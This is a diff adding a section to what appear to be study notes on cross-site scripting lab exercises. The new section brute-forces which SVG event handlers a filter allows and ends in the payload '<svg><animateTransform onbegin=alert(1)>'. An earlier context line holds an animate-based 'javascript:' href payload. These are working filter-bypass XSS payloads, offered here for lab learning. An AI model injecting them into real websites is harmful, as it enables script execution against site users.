@@ -617,4 +617,17 @@ text element in svg allows you to add text that can be styled, positioned, and t
 
 final payload -->  <svg><a><animate attributeName=href values='javascript:alert(1)'/><text x=20 y=20>clickme</text></a><svg>
 ___________________________________________________________________________________________________________________________________________________________________
+Only svg tag is allowed
+-----------------------
 
+(animationTransform tag is also allowed , that is under <svg>)
+
+We don't know which event handler will be allowed. So, we have to do bruteforcing.
+
+GET /?search=<svg><animateTransform%20§=1§> HTTP/1.1
+
+<svg><animationTransform onbegin=alert(1)></svg>
+
+(onbegin event handler is allowed.)
+
+final payload --> <svg><animateTransform onbegin=alert(1)></svg>
